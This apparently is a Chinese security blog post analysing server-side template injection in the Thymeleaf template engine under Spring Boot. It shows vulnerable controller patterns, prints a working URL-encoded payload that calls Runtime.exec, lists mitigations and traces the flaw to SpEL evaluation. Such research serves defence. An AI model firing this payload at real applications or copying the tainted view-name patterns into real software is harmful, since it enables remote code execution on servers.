---
typora-root-url: ../../../static
title: "Thymeleaf安全研究"
date: 2021-06-15T17:07:36+08:00
draft: false
categories: ["security"]
---

## 简介

Thymeleaf 是一个类似Velocity、FreeMarker 的Java模板引擎，而且Spring Boot推荐使用Thymeleaf引擎。它支持 HTML 原型，在 HTML 标签中增加额外的属性来达到模板 + 数据的展示方式。

SpringBoot 提供了 Thymeleaf 的默认配置，并且为 Thymeleaf 设置了视图解析器，我们可以像以前操作 jsp 一样来操作 Thymeleaf。

## 基本使用

需要在 `pom.xml` 中引入Thymeleaf 依赖：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```

创建模板文件 `templates\welcome.html` ：

```html
<!DOCTYPE HTML>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<div th:fragment="header">
    <h3>Spring Boot Web Thymeleaf Example</h3>
</div>
<div th:fragment="main">
    <span th:text="'Hello, ' + ${message}"></span>
</div>
</html>
```

创建控制器：

```java
@GetMapping("/")
public String index(Model model,String msg) {
    model.addAttribute("message", msg);
    return "welcome";
}
```

当我们访问 `http://127.0.0.1:8090/?msg=p1n93r` ，将渲染模板给用户展示：

![image-20210811165225943](/media/image-20210811165225943.png)

## 漏洞演示

漏洞环境：[https://github.com/hex0wn/learn-java-bug/tree/master/thymeleaf-ssti](https://github.com/hex0wn/learn-java-bug/tree/master/thymeleaf-ssti)

简而言之，Thymeleaf SSTI一般发生在攻击者可以控制视图名的位置，例如如下场景：

```java
@GetMapping("/path")
public String path(@RequestParam String lang) {
    //template path is tainted
    return "user/" + lang + "/welcome"; 
}

@GetMapping("/fragment")
public String fragment(@RequestParam String section) {
    //fragment is tainted
    return "welcome :: " + section; 
}

// 返回值为空，则视图名就取决于URI的值
// 所以这里视图名间接的被攻击者控制
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    //returns void, so view name is taken from URI
    log.info("Retrieving " + document);
}
```

例如如下所示，利用Thymeleaf SSTI成功RCE：

![image-20210811171130339](/media/image-20210811171130339.png)

## 预防方法

主要存在以下几种方式：

1. 使用 `@ResponseBody` 注解；
2. 模板名称由 `redirect:` 或 `forward:` 开始（于此不会被ThymeleafView渲染）；
3. 控制器方法的形参中有`HttpServletResponse`，`response`已经被处理；

## 漏洞分析

首先贴出POC：

```java
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
```

使用thymeleaf进行模板渲染，首先会调用 `org.thymeleaf.spring5.view.ThymeleafView#renderFragment()` ，看到里面的代码片段及解释：

![image-20210811175151930](/media/image-20210811175151930.png)

所以这也就解释了为什么POC中会存在 `::` 符号。继续跟进，一直到 `org.thymeleaf.standard.expression.StandardExpressionPreprocessor#preprocess()` ，这个操作叫做 **预处理** ，也就是预处理 `__(.*?)__` 中的表达式，代码的说明和解释如下：

![image-20210811180600898](/media/image-20210811180600898.png)

继续跟进，发现底层其实是使用SpEL Evaluator进行执行，于是其实最终是形成一个SpEL表达式注入：

![image-20210811180834058](/media/image-20210811180834058.png)

小结一下， **Thymeleaf的SSTI其实出现在表达式的预处理** 位置，除了前面的场景，预处理是否可以应用在模板中呢？根据官方文档：[https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/standard-expression-syntax.html](https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/standard-expression-syntax.html)

![image-20210811181646914](/media/image-20210811181646914.png)

可知，模板中也是支持预处理的。我们实验一下：

首先清楚，thymeleaf支持以下几种表达式：

- ${…}: 变量表达式
- *{…}: 选择表达式
- #{…}: 消息表达式
- @{…}: 链接表达式
-  ~{…}: 片段表达式  

我们可以在上面任意一种表达式内使用表达式预处理，例如下面所示（ `@{__${link}__}` ）：

```html
<!DOCTYPE HTML>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<div th:fragment="header">
    <h3>Spring Boot Web Thymeleaf Example</h3>
</div>
<div th:fragment="main">
    <span th:text="'Hello, ' + ${message}"></span>
    <a th:href="@{__${link}__}">test</a>
</div>
</html>
```

且表达式 `@{__${link}__}` 中的 `link` 可以被攻击者控制：

```java
@GetMapping("/")
public String index(Model model,String msg,String returnUrl) {
    model.addAttribute("message", msg);
    model.addAttribute("link", returnUrl);
    return "welcome";
}
```

可以和前面分析的一样，造成RCE：

![image-20210811183008247](/media/image-20210811183008247.png)

这条链中，最终使用 `EngineEventUtils.computeAttributeExpression(context, tag, attributeName, attributeValue)` 来计算属性表达式：

![image-20210811190150871](/media/image-20210811190150871.png)

最终会执行链接表达式内的变量表达式：

![image-20210811190459948](/media/image-20210811190459948.png)

## 总结

使用Thymeleaf进行SSTI，需要关注以下几个地方：

- 可控的视图名。（不能使用 `@ResponseBody` 、 `HttpServletResponse` 以及 `redirect:` 和 `forward:` ）;
- 模板内可控的预处理变量，例如上面例子中的 `@{__${link}__}` ;

## 参考

- [https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/standard-expression-syntax.html](https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/standard-expression-syntax.html)
- [https://github.com/veracode-research/spring-view-manipulation/](https://github.com/veracode-research/spring-view-manipulation/)
- [https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability)
- [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
- [https://paper.seebug.org/1332/](https://paper.seebug.org/1332/)